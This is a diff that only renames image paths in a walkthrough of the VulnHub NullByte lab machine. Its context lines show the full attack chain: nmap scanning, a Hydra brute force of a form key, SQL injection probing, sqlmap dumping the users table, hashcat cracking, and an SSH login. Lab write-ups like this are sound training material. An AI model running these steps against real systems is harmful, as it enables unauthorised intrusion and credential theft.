@@ -3,7 +3,7 @@
 - **Machine:** NullByte: 1
 - **Download:** https://www.vulnhub.com/entry/nullbyte-1,126/
 
-![](807-1.png)
+![](images/807-1.png)
 
 ---
 
@@ -24,7 +24,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](807-2.png)
+![](images/807-2.png)
 
 ---
 
@@ -36,7 +36,7 @@ Run a complete scan to identify all open ports, services, OS information, and de
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.169
 ```
 
-![](807-3.png)
+![](images/807-3.png)
 
 ---
 
@@ -60,7 +60,7 @@ Use the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.169
 ```
 
-![](807-4.png)
+![](images/807-4.png)
 
 ---
 
@@ -74,7 +74,7 @@ http://192.168.2.169
 
 Inspect the page source.
 
-![](807-5.png)
+![](images/807-5.png)
 
 ---
 
@@ -92,7 +92,7 @@ Extract metadata.
 exiftool main.gif
 ```
 
-![](807-6.png)
+![](images/807-6.png)
 
 A hidden comment is present.
 
@@ -116,7 +116,7 @@ Brute-force directories.
 gobuster dir -u http://192.168.2.169/kzMb5nVYJw/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-![](807-7.png)
+![](images/807-7.png)
 
 ---
 
@@ -128,7 +128,7 @@ Use Hydra to brute-force the key.
 hydra 192.168.2.169 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l "" -P /usr/share/dict/words -t 10 -w 30
 ```
 
-![](807-8.png)
+![](images/807-8.png)
 
 Recovered key:
 
@@ -142,17 +142,17 @@ Enter the key at:
 http://192.168.2.169/kzMb5nVYJw/index.php
 ```
 
-![](807-9.png)
+![](images/807-9.png)
 
 Press **Enter**.
 
 A search form appears.
 
-![](807-10.png)
+![](images/807-10.png)
 
 Enter any value.
 
-![](807-11.png)
+![](images/807-11.png)
 
 The application redirects to:
 
@@ -160,7 +160,7 @@ The application redirects to:
 http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc
 ```
 
-![](807-12.png)
+![](images/807-12.png)
 
 ---
 
@@ -172,7 +172,7 @@ Test the parameter for SQL injection.
 http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch="
 ```
 
-![](807-13.png)
+![](images/807-13.png)
 
 The application is vulnerable to SQL Injection.
 
@@ -186,7 +186,7 @@ Enumerate available databases.
 sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" --dbs
 ```
 
-![](807-14.png)
+![](images/807-14.png)
 
 ---
 
@@ -196,7 +196,7 @@ sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" --dbs
 sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth --tables
 ```
 
-![](807-15.png)
+![](images/807-15.png)
 
 ---
 
@@ -206,7 +206,7 @@ sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D set
 sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users --columns
 ```
 
-![](807-16.png)
+![](images/807-16.png)
 
 ---
 
@@ -218,7 +218,7 @@ Dump selected columns.
 sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users -C position,user,id,pass --dump
 ```
 
-![](807-17.png)
+![](images/807-17.png)
 
 Or dump the complete table.
 
@@ -226,7 +226,7 @@ Or dump the complete table.
 sqlmap -u "http://192.168.2.169/kzMb5nVYJw/420search.php?usrtosearch=abc" -D seth -T users --dump
 ```
 
-![](807-18.png)
+![](images/807-18.png)
 
 Recovered password value:
 
@@ -244,7 +244,7 @@ Decode the Base64 value.
 echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d
 ```
 
-![](807-19.png)
+![](images/807-19.png)
 
 Decoded value:
 
@@ -258,7 +258,7 @@ Identify the hash.
 hash-identifier c6d6bd7ebf806f43c76acc3681703b81
 ```
 
-![](807-20.png)
+![](images/807-20.png)
 
 Save the hash.
 
@@ -272,7 +272,7 @@ Crack it with Hashcat.
 hashcat -m 0 hash.txt /opt/rockyou.txt
 ```
 
-![](807-21.png)
+![](images/807-21.png)
 
 Recovered credentials:
 
@@ -293,7 +293,7 @@ Login using the recovered credentials.
 ssh -p 777 ramses@192.168.2.169
 ```
 
-![](807-22.png)
+![](images/807-22.png)
 
 Successfully obtained an interactive SSH shell.
 
